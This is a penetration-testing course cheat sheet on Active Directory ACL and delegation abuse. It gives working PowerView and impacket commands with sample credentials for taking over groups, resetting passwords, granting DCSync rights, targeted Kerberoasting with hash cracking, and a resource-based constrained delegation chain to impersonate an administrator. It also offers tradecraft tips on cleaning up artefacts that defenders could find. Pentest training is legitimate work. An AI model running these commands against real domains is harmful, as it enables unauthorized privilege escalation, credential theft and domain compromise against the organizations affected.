---
template: cheatsheet.html
hide:
  - navigation
  - toc
---

# Cheat sheet — ACL & Delegation Abuse

*Companion to [Module 05 — ACL & Delegation Abuse](README.md) · CC BY 4.0 — print it, pin it, share it.*

*Last reviewed: 2026-07*

> Only test Active Directory environments you own or have explicit written permission to test.

## The dangerous ACEs (what each edge lets you do)

| ACE / edge | On a group | On a user | On a computer |
|---|---|---|---|
| `GenericWrite` | add any member | write attrs → shadow creds / targeted roast | write RBCD attribute |
| `GenericAll` | full control | full control (reset pw) | full control |
| `WriteDacl` | rewrite the ACL → grant yourself anything | same | same |
| `WriteOwner` | take ownership → then WriteDacl | same | same |
| `AllExtendedRights` | — | force password change | read LAPS `ms-Mcs-AdmPwd` |

## Enumerate ACLs — PowerView (Windows / PowerShell)

```powershell
Import-Module .\PowerView.ps1
# Who has interesting rights ON a principal you care about
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match "WriteDacl|WriteOwner|GenericWrite|GenericAll" }
# Everything a principal you control can write to
Get-DomainObjectAcl -ResolveGUIDs |
  ? { $_.SecurityIdentifier -eq (Get-DomainUser jsmith).objectsid }
Get-DomainComputer -Unconstrained          # unconstrained delegation hosts
Get-DomainUser -TrustedToAuth              # constrained delegation principals
```

## Exploit ACLs — PowerView

```powershell
Add-DomainGroupMember -Identity "IT-Admins" -Members jsmith        # via GenericWrite on the group
Set-DomainObjectOwner -Identity "IT-Admins" -OwnerIdentity jsmith  # via WriteOwner
Add-DomainObjectAcl -TargetIdentity "IT-Admins" -PrincipalIdentity jsmith -Rights All  # via WriteDacl
Set-DomainUserPassword -Identity svc-legacy -AccountPassword (ConvertTo-SecureString 'New1!' -AsPlainText -Force)
```

## Edit DACLs from Linux — dacledit.py (impacket)

```bash
# Read the current DACL on a target object
dacledit.py -action read -target "Domain Admins" corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10
# Grant jsmith full control over a target (write, if you have WriteDacl/WriteOwner)
dacledit.py -action write -rights FullControl -principal jsmith -target-dn \
  "CN=IT-Admins,OU=Groups,DC=corp,DC=local" corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10
# Grant DCSync (replication) rights
dacledit.py -action write -rights DCSync -principal jsmith -target "corp.local" \
  corp.local/administrator:'P@ss' -dc-ip 10.10.0.10
```

## Targeted Kerberoast — GenericWrite on a user → roast on demand

```bash
# Temporarily writes an SPN to a user you can edit, roasts it, then removes the SPN.
targetedKerberoast.py -v -d corp.local -u jsmith -p 'Welcome1!' --dc-ip 10.10.0.10
# → drops $krb5tgs$ hashes for every user you have write access to; crack with hashcat -m 13100
```

## RBCD — GenericWrite on a computer → impersonate anyone to it

```bash
# 1. Create/own a computer account to act as the delegated identity
addcomputer.py corp.local/jsmith:'Welcome1!' -computer-name 'EVIL$' -computer-pass 'Pass123!' -dc-ip 10.10.0.10
# 2. Write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
rbcd.py -delegate-to 'SRV-FILE-01$' -delegate-from 'EVIL$' -action write \
  corp.local/jsmith:'Welcome1!' -dc-ip 10.10.0.10
# 3. Impersonate a local admin to the target and get a service ticket
getST.py -spn 'cifs/srv-file-01.corp.local' -impersonate administrator \
  corp.local/'EVIL$':'Pass123!' -dc-ip 10.10.0.10
```

## Gotchas worth remembering

- **`WriteDacl`/`WriteOwner` are self-amplifying.** They don't grant access directly — they let you grant
  yourself *any* right, so they're more dangerous than plain membership. The chain of edits *is* the path.
- **`GenericWrite` on a computer is not a minor finding.** It enables RBCD (impersonate any user to that
  host) *and* shadow credentials — no Domain Admin required. Treat it as a critical.
- **These survive a "we patched everything" domain.** LAPS, Credential Guard, and strong passwords do
  nothing about a service account with `GenericWrite` on a privileged group — and a "who's in DA?" audit never sees it.
- **RBCD needs an SPN on the source account.** A plain user often can't; a *computer* account you create
  (via `addcomputer.py`, if `ms-DS-MachineAccountQuota > 0`) can. That quota being non-zero is the enabler.
- **Clean up after targeted Kerberoast / RBCD writes.** The tools add then remove the SPN or ACE, but a
  failed run can leave your ACE behind — an artefact a defender (or the next assessor) will find.
- **`-target` vs `-target-dn` in dacledit.py:** pass the full distinguished name for `-target-dn`; a bare
  sAMAccountName only works with `-target`. Wrong one = "object not found," not an obvious error.
